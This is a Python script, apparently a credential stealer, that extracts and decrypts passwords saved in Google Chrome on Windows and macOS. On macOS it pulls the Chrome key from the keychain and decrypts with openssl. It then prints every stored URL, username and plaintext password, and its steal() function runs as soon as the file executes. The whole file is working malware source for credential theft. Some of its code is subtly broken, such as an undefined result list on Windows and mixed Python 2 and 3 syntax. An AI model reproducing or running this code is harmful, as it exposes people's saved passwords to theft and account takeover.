import platform
#windows imports
if platform.system() == "Windows":
	import os
	import sqlite3
	import win32crypt
	import sys
#osx imports
elif platform.system() == 'Darwin':
	import sqlite3
	from os import path
	import binascii
	import subprocess
	import base64
	from hashlib import pbkdf2_hmac

def queryDB(DBpath):
	# Try to open the SQLite3 database
	try:
		conn = sqlite3.connect(DBpath)
		cursor = conn.cursor()
	except:
		return ('[-] Couldn\'t open the database')
	# Execute the query
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
	except:
		return ('[-] Error getting the passwords')
	# Fetch all data
	return cursor.fetchall()

def steal():
	# Do only if on Windows, Linux and Mac support will be added later
	if platform.system() == "Windows":
		steal_windows()
	elif platform.system()=='Darwin':
		steal_osx()
	else:
		print("[-] "+platform.system()+"is not a supported OS")

def steal_osx():
	#get the passwords
	data = queryDB(path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))

	#get encrpytion key from keychain
	safe_storage_key = subprocess.Popen(
		"security find-generic-password -wa "
		"'Chrome'",
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		shell=True)
	stdout, stderr = safe_storage_key.communicate()
	safe_storage_key = stdout.replace("\n", "")


	#catch keychain errors
	if stderr:
		print("Error: Chrome entry not found in keychain?".format(stderr))
		return
	if not stdout:
		print("User clicked deny.")

	#Loop through the passwords
	if len(data) > 0:
		for result in data:
	  		#Setup initialisation vector
	  		iv = ''.join(('20', ) * 16)

			#setup decryption key
			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
			hex_key = binascii.hexlify(key)

			#decrpyt password with key
			hex_enc_password = base64.b64encode(result[2][3:])

		    # send any error messages to /dev/null to prevent screen bloating up
		    # (any decryption errors will give a non-zero exit, causing exception)
			try:
				if hex_enc_password:
					#decrpyt with openssl
					password = subprocess.check_output(
						"openssl enc -base64 -d "
						"-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
						hex_enc_password+" 2>/dev/null",
						shell=True)
					print "[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
			except subprocess.CalledProcessError:
				password = "Error decrypting this data"
		return
	else:
		print '[-] There are no passwords'
		return


def steal_windows():
	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
	data = queryDB(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')

	# Check if there is any data
	if len(data) > 0:
		for result in data:
		# Decrypt the Password
			try:
			# The good/bad thing about the Chrome passwords is that they are easily decryptable
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except:
				# If it fails no biggie try another one
				pass
			# If the password is found
			if password:
				# If the URL is blank,print it as (Unknown)
				if(len(result[0]) <= 0):
					result[0] = "(Unknown)"
				# Print the result
				ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
		return ret
	else:
		return ('[-] There are no passwords')

steal()
